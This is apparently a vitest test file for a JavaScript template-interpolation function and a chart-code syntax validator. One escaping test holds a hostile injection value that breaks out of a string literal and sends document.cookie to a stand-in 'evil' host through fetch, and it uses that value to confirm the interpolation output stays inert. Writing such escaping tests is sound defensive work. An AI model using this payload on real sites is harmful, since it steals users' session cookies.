import { describe, it, expect } from 'vitest';
import { interpolateJsSource, validateJsSyntax } from './interpolate-js-source';

// Stand-in for the variable processor: resolves a token to its literal value.
const resolver = (values: Record<string, string>) => (token: string) => {
	const key = token.replace(/^\{\{\s*|\s*\}\}$/g, '');
	return key in values ? values[key] : token;
};

describe('interpolateJsSource', () => {
	it('embeds numeric values as unquoted JS numbers', () => {
		const out = interpolateJsSource('{ max: {{ threshold }} }', resolver({ threshold: '4100000' }));
		expect(out).toBe('{ max: 4100000 }');
	});

	it('embeds booleans and null unquoted', () => {
		expect(interpolateJsSource('{{ a }}', resolver({ a: 'true' }))).toBe('true');
		expect(interpolateJsSource('{{ a }}', resolver({ a: 'null' }))).toBe('null');
	});

	it('embeds string values as quoted JS string literals', () => {
		const out = interpolateJsSource('{ name: {{ region }} }', resolver({ region: 'NYT' }));
		expect(out).toBe('{ name: "NYT" }');
	});

	it('cannot break out of the literal even with hostile quotes/code', () => {
		const hostile = `"); fetch("//evil?"+document.cookie);//`;
		const out = interpolateJsSource('{ name: {{ x }} }', resolver({ x: hostile }));
		// The whole value stays a single inert string literal — no statement escapes.
		expect(out).toBe(`{ name: ${JSON.stringify(hostile)} }`);
		expect(() => new Function(`return (${out})`)).not.toThrow();
		expect((new Function(`return (${out})`)() as { name: string }).name).toBe(hostile);
	});

	it('resolves multiple tokens independently', () => {
		const out = interpolateJsSource('[{{ a }}, {{ b }}]', resolver({ a: '1', b: 'two' }));
		expect(out).toBe('[1, "two"]');
	});
});

describe('validateJsSyntax', () => {
	it('accepts a bare object-expression body', () => {
		expect(validateJsSyntax(`({ series: [{ type: 'bar' }] })`)).toBeUndefined();
		expect(
			validateJsSyntax(`{ series: [{ type: 'bar', tooltip: { formatter: (p) => p.value } }] }`)
		).toBeUndefined();
	});

	it('accepts a statement body with an explicit return', () => {
		expect(
			validateJsSyntax(`const m = Math.max(1, 2);\nreturn { yAxis: { max: m } };`)
		).toBeUndefined();
	});

	it('reports a message for empty bodies', () => {
		expect(validateJsSyntax('   ')).toMatch(/Add the chart code/);
	});

	it('reports syntax errors', () => {
		expect(validateJsSyntax('{ series: [ }')).toBeTruthy();
		expect(validateJsSyntax('const x = ;')).toBeTruthy();
	});

	it('catches "const data = ..." clashes with exposed globals at validation time', () => {
		// Regression: the runtime wraps the body with new Function(...globals,
		// body). A `const` that shadows a global name throws strict-mode
		// "Cannot declare a const variable twice" — invisible to a syntax
		// check that doesn't compile with the same parameter list. The agent
		// then has to round-trip via debug_code to discover what edit_page
		// SHOULD have rejected. Mirroring the runtime here puts the error in
		// the edit_page validation result where it belongs.
		const err = validateJsSyntax('const data = [1, 2, 3]; return { series: [] };');
		expect(err).toMatch(/data/);
		// Same hazard for the other documented globals.
		expect(validateJsSyntax('const fmt = "usd"; return {};')).toMatch(/fmt/);
		expect(validateJsSyntax('const echarts = null; return {};')).toMatch(/echarts/);
	});

	it('still accepts code that uses globals without shadowing them', () => {
		// Sanity: the regression test above should NOT be over-strict. Reading
		// from globals or assigning under a different name must remain valid.
		expect(validateJsSyntax('const myRows = data.filter(r => r.x > 0); return {};')).toBeUndefined();
		expect(validateJsSyntax('return { tooltip: { valueFormatter: (v) => fmt(v, "usd0") } };')).toBeUndefined();
	});
});
